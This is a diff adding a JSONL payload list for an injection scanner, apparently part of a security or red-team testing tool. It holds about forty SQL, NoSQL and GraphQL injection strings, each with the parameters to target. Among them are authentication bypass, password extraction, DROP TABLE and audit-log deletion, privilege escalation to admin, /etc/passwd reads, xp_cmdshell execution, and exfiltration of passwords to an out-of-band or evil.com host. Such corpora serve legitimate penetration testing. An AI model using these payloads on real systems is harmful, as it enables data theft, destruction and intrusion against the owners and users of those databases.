@@ -1,0 +1,40 @@
+{"id": "generic_001", "type": "generic", "payload": "' OR '1'='1", "description": "Classic boolean-based SQLi", "target_params": ["query", "search", "filter", "id", "user_id"]}
+{"id": "generic_002", "type": "generic", "payload": "1; DROP TABLE users--", "description": "Destructive SQLi (safe probe - most DBs reject)", "target_params": ["id", "user_id", "resource_id"]}
+{"id": "generic_003", "type": "generic", "payload": "1 UNION SELECT null,null,null--", "description": "UNION-based SQLi", "target_params": ["id", "query", "search"]}
+{"id": "generic_004", "type": "generic", "payload": "' AND '1'='1", "description": "Boolean-based blind SQLi", "target_params": ["query", "filter", "search"]}
+{"id": "generic_005", "type": "generic", "payload": "'; SELECT * FROM users--", "description": "Stacked query SQLi", "target_params": ["query", "id"]}
+{"id": "generic_006", "type": "generic", "payload": "1' OR '1'='1' --", "description": "Comment-based SQLi", "target_params": ["id", "user_id"]}
+{"id": "generic_007", "type": "generic", "payload": "admin'--", "description": "Authentication bypass", "target_params": ["username", "user", "login"]}
+{"id": "generic_008", "type": "generic", "payload": "' OR 1=1--", "description": "Numeric boolean SQLi", "target_params": ["id", "user_id", "resource_id"]}
+{"id": "generic_009", "type": "generic", "payload": "1' UNION SELECT password FROM users--", "description": "Password extraction", "target_params": ["id", "query"]}
+{"id": "generic_010", "type": "generic", "payload": "'; WAITFOR DELAY '00:00:05'--", "description": "Time-based blind SQLi (SQL Server)", "target_params": ["query", "search"]}
+{"id": "aurora_dsql_001", "type": "aurora_dsql_bypass", "payload": "SELECT 1; COMMIT", "description": "Aurora DSQL read-only bypass - CVD pattern", "target_params": ["query", "sql"]}
+{"id": "aurora_dsql_002", "type": "aurora_dsql_bypass", "payload": "SELECT 1; BEGIN; INSERT INTO test_llmrt_probe VALUES(1)--", "description": "Aurora DSQL transaction bypass", "target_params": ["query", "sql"]}
+{"id": "aurora_dsql_003", "type": "aurora_dsql_bypass", "payload": "SELECT 1; CREATE TABLE test_llmrt_probe_check(id int)--", "description": "Aurora DSQL DDL bypass", "target_params": ["query", "sql"]}
+{"id": "aurora_dsql_004", "type": "aurora_dsql_bypass", "payload": "SELECT 1; BEGIN TRANSACTION; UPDATE users SET role='admin'--", "description": "Aurora DSQL privilege escalation", "target_params": ["query", "sql"]}
+{"id": "aurora_dsql_005", "type": "aurora_dsql_bypass", "payload": "SELECT 1; COMMIT; DELETE FROM audit_log--", "description": "Aurora DSQL audit bypass", "target_params": ["query", "sql"]}
+{"id": "postgres_001", "type": "postgres", "payload": "'; SELECT pg_sleep(5)--", "description": "PostgreSQL time-based blind", "target_params": ["query", "search"]}
+{"id": "postgres_002", "type": "postgres", "payload": "'; COPY users TO '/tmp/users.txt'--", "description": "PostgreSQL file write", "target_params": ["query"]}
+{"id": "postgres_003", "type": "postgres", "payload": "'; SELECT version()--", "description": "PostgreSQL version disclosure", "target_params": ["query", "id"]}
+{"id": "mysql_001", "type": "mysql", "payload": "'; SELECT SLEEP(5)--", "description": "MySQL time-based blind", "target_params": ["query", "search"]}
+{"id": "mysql_002", "type": "mysql", "payload": "'; SELECT LOAD_FILE('/etc/passwd')--", "description": "MySQL file read", "target_params": ["query"]}
+{"id": "mysql_003", "type": "mysql", "payload": "'; SELECT @@version--", "description": "MySQL version disclosure", "target_params": ["query", "id"]}
+{"id": "sqlite_001", "type": "sqlite", "payload": "'; SELECT sqlite_version()--", "description": "SQLite version disclosure", "target_params": ["query", "id"]}
+{"id": "sqlite_002", "type": "sqlite", "payload": "'; ATTACH DATABASE '/tmp/evil.db' AS evil--", "description": "SQLite database attachment", "target_params": ["query"]}
+{"id": "mssql_001", "type": "mssql", "payload": "'; EXEC xp_cmdshell('whoami')--", "description": "MSSQL command execution", "target_params": ["query"]}
+{"id": "mssql_002", "type": "mssql", "payload": "'; SELECT @@version--", "description": "MSSQL version disclosure", "target_params": ["query", "id"]}
+{"id": "oracle_001", "type": "oracle", "payload": "'; SELECT banner FROM v$version--", "description": "Oracle version disclosure", "target_params": ["query", "id"]}
+{"id": "oracle_002", "type": "oracle", "payload": "'; SELECT UTL_HTTP.REQUEST('http://evil.com')--", "description": "Oracle SSRF", "target_params": ["query"]}
+{"id": "nosql_001", "type": "nosql", "payload": "{\"$ne\": null}", "description": "MongoDB NoSQL injection", "target_params": ["query", "filter"]}
+{"id": "nosql_002", "type": "nosql", "payload": "{\"$gt\": \"\"}", "description": "MongoDB comparison operator injection", "target_params": ["query", "filter"]}
+{"id": "nosql_003", "type": "nosql", "payload": "{\"$where\": \"this.password == 'admin'\"}", "description": "MongoDB JavaScript injection", "target_params": ["query", "filter"]}
+{"id": "graphql_001", "type": "graphql", "payload": "query { users { id password } }", "description": "GraphQL introspection", "target_params": ["query"]}
+{"id": "graphql_002", "type": "graphql", "payload": "query { __schema { types { name } } }", "description": "GraphQL schema disclosure", "target_params": ["query"]}
+{"id": "second_order_001", "type": "second_order", "payload": "admin'--", "description": "Second-order SQLi - stored payload", "target_params": ["username", "name", "comment"]}
+{"id": "second_order_002", "type": "second_order", "payload": "'; UPDATE users SET role='admin' WHERE username='victim'--", "description": "Second-order privilege escalation", "target_params": ["bio", "description", "comment"]}
+{"id": "blind_001", "type": "blind", "payload": "' AND (SELECT COUNT(*) FROM users) > 0--", "description": "Boolean-based blind SQLi", "target_params": ["id", "query"]}
+{"id": "blind_002", "type": "blind", "payload": "' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--", "description": "Character-by-character extraction", "target_params": ["id", "query"]}
+{"id": "error_based_001", "type": "error_based", "payload": "' AND 1=CONVERT(int,(SELECT @@version))--", "description": "Error-based information disclosure", "target_params": ["id", "query"]}
+{"id": "error_based_002", "type": "error_based", "payload": "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--", "description": "Error-based data extraction", "target_params": ["id", "query"]}
+{"id": "oob_001", "type": "oob", "payload": "'; SELECT UTL_HTTP.REQUEST('http://{{oob_server}}/exfil?data='||password) FROM users--", "description": "Out-of-band data exfiltration", "target_params": ["query"]}
+{"id": "oob_002", "type": "oob", "payload": "'; EXEC master..xp_dirtree '\\\\{{oob_server}}\\share'--", "description": "MSSQL OOB via UNC path", "target_params": ["query"]}
